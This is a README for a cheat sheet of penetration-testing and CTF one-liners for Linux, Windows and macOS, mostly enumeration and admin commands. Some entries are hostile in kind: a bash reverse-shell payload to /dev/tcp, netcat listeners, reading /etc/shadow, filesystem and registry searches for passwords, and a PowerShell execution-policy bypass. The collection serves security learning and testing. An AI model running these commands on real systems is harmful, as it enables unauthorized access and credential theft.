# ⚙️ Awesome CMD One-Liners for Linux, Windows & macOS

A comprehensive collection of powerful one-liners used across CTFs, penetration tests, and day-to-day cybersecurity tasks. Whether you're trying to pop a shell, enumerate a system, or just make your workflow smoother, these quick commands will save time and deliver results.

---

## 📊 Repository Stats
- **Total Commands**: 200+ across all platforms
- **Platforms**: Linux, Windows, macOS
- **Categories**: System Enumeration, Network Commands, Privilege Escalation, File Operations
- **Last Updated**: January 2025

---

## ⚠️ Legal & Ethical Disclaimer

> This repository is **for educational purposes only**.  
> Use these commands only on systems you own or have **explicit permission** to test.  
> I am not responsible for any unauthorized use or damage caused by the misuse of these commands.

---

## 🐧 Linux One-Liners (60+ commands)

### 🔍 System Enumeration
- `find / -perm -4000 2>/dev/null` - Find all SUID binaries
- `find / -perm -2000 2>/dev/null` - Find all SGID binaries
- `find / -type f -name "*.conf" 2>/dev/null` - Find configuration files
- `find / -name "*.log" 2>/dev/null` - Find log files

### 🌐 Network Commands
- `nc -lvnp 4444` - Start netcat listener
- `curl ifconfig.me` - Get public IP address
- `wget http://[IP]/file` - Download file via HTTP
- `scp user@host:/path/to/file .` - Secure copy remote file

### 🔐 Privilege Escalation
- `sudo -l` - Check sudo privileges
- `cat /etc/passwd | grep -E ":[0-9]{4}:"` - Find users with UID 1000+
- `cat /etc/shadow 2>/dev/null` - View shadow file (if accessible)
- `grep -r "password" / 2>/dev/null` - Hunt for password strings

### 📁 File Operations
- `chmod +x script.sh && ./script.sh` - Make executable and run
- `tar -cvf archive.tar folder/` - Create archive
- `grep -r "flag" / 2>/dev/null` - Search for flag files
- `find / -name "*.txt" -exec cat {} \; 2>/dev/null` - Read all txt files

### 🐚 Shell Operations
- `echo 'bash -i >& /dev/tcp/IP/PORT 0>&1'` - Reverse shell payload
- `python3 -c 'import pty; pty.spawn("/bin/bash")'` - Spawn interactive shell
- `export PATH=/tmp:$PATH` - Add /tmp to PATH

### 📡 Network Scanning
- `nmap -sC -sV [IP]` - Basic nmap scan
- `nmap -p- [IP]` - Scan all ports
- `nmap --script vuln [IP]` - Vulnerability scan
- `masscan [IP] -p80,443,22,21` - Fast port scan

**[View all Linux commands →](./Linux)**

---

## 🪟 Windows One-Liners (50+ commands)

### 🔍 System Enumeration
- `whoami /priv` - Display user privileges
- `whoami /groups` - Show user group memberships
- `systeminfo` - Detailed system information
- `wmic os get name,version` - Get OS name and version

### 🌐 Network Commands
- `netstat -ano` - View active connections with PIDs
- `netstat -an | findstr LISTENING` - Show listening ports
- `ipconfig /all` - Show all network configuration
- `route print` - Show routing table

### 🔐 Privilege Escalation
- `whoami /priv` - Check current privileges
- `net user` - List local users
- `net localgroup administrators` - List administrators
- `reg query HKLM /f password /t REG_SZ /s` - Search registry for passwords

### 📁 File Operations
- `dir /s /b` - List all files recursively
- `dir /a:h /s` - Show hidden files
- `type C:\Users\*\Desktop\*.txt` - Read all txt files on desktops
- `copy file1 file2` - Copy file

### 🐚 Command Execution
- `cmd /c "command"` - Execute command
- `powershell -Command "command"` - Execute PowerShell command
- `powershell -ExecutionPolicy Bypass -File script.ps1` - Run PowerShell script

### 🔍 Active Directory (if domain)
- `net user /domain` - List domain users
- `net group /domain` - List domain groups
- `net group "Domain Admins" /domain` - List domain admins
- `dsquery user` - Query AD users

**[View all Windows commands →](./Windows)**

---

## 🍎 macOS One-Liners (40+ commands)

### 🔍 System Enumeration
- `find / -perm +4000 2>/dev/null` - Find all SUID binaries
- `find / -perm +2000 2>/dev/null` - Find all SGID binaries
- `find / -name "*.plist" 2>/dev/null` - Find preference files
- `find / -name ".DS_Store" 2>/dev/null` - Find .DS_Store files

### 🌐 Network Commands
- `nc -lvnp 4444` - Start netcat listener
- `curl ifconfig.me` - Get public IP
- `scp user@host:/path/to/file .` - Secure copy remote file
- `ssh user@host "command"` - Execute remote command

### 🔐 Privilege Escalation
- `sudo -l` - Check sudo privileges
- `dscl . -list /Users` - List all users
- `dscl . -read /Users/[username]` - Get user details
- `groups [username]` - Show user groups

### 🔍 macOS Specific
- `defaults read [domain] [key]` - Read preference
- `defaults write [domain] [key] [value]` - Write preference
- `plutil -p file.plist` - Parse property list
- `security find-certificate -a` - List certificates

### 🔧 Application Management
- `brew list` - List installed packages
- `brew search [package]` - Search for packages
- `brew install [package]` - Install package
- `brew update` - Update Homebrew

**[View all macOS commands →](./MacOS)**

---

## 🎯 Use Cases

### Penetration Testing
- **Initial Reconnaissance**: System enumeration and information gathering
- **Privilege Escalation**: Finding and exploiting privilege escalation vectors
- **Network Mapping**: Understanding target infrastructure
- **Data Exfiltration**: Extracting and transferring data

### CTF Challenges
- **Quick Enumeration**: Fast reconnaissance during time-constrained challenges
- **Shell Access**: Gaining and maintaining access to target systems
- **Flag Hunting**: Searching for and extracting challenge flags
- **Tool Integration**: Commands that work with existing toolchains

### System Administration
- **Troubleshooting**: Quick diagnostic commands for system issues
- **Security Auditing**: Checking system security configurations
- **Log Analysis**: Parsing and analyzing system logs
- **Automation**: Commands that can be scripted for automation

---

## 📈 Skills Demonstrated

This repository showcases my ability to:
- **Cross-Platform Proficiency** - Commands for Linux, Windows, and macOS
- **Security Tool Mastery** - Understanding of penetration testing tools and techniques
- **System Administration** - Knowledge of operating system internals and administration
- **Problem-Solving** - Quick solutions for common security and administration tasks
- **Documentation** - Clear, organized command references with explanations

---

## 🔧 Customization & Extension

Each command can be customized for specific needs:
- **Parameter Modification** - Adjust IP addresses, ports, and file paths
- **Command Chaining** - Combine multiple commands with pipes and operators
- **Scripting Integration** - Use these commands as building blocks for larger scripts
- **Tool Integration** - Incorporate with existing security tools and frameworks

---

## 📚 Learning Resources

### Linux
- [Linux Command Line Tutorial](https://www.guru99.com/linux-commands-cheat-sheet.html)
- [Linux Privilege Escalation Guide](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
- [Linux System Administration](https://www.linux.org/forums/linux-basic-questions.41/)

### Windows
- [Windows Command Line Reference](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands)
- [Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [PowerShell Documentation](https://docs.microsoft.com/en-us/powershell/)

### macOS
- [macOS Command Line](https://developer.apple.com/library/archive/documentation/OpenSource/Conceptual/ShellScripting/Introduction/Introduction.html)
- [macOS Security](https://support.apple.com/en-us/HT201222)
- [Homebrew Documentation](https://docs.brew.sh/)

---

## 🤝 Contributions Welcome!

Have a killer one-liner? Open a pull request and let's grow this arsenal together.

**Guidelines for contributions:**
- Test commands before submitting
- Include clear descriptions
- Organize by category and platform
- Follow existing formatting

---

## 📞 Contact & Collaboration

- **GitHub**: [@GageGotya](https://github.com/GageGotya)
- **LinkedIn**: [Gage Ayala](https://linkedin.com/in/gage-ayala-0207b42ab)
- **TryHackMe**: [GageGotya](https://tryhackme.com/r/p/GageGotya)

*Interested in collaborating on security tools or discussing command-line techniques? Feel free to reach out!*

---

> 🧠 **"One good command can save hours of hard work."**
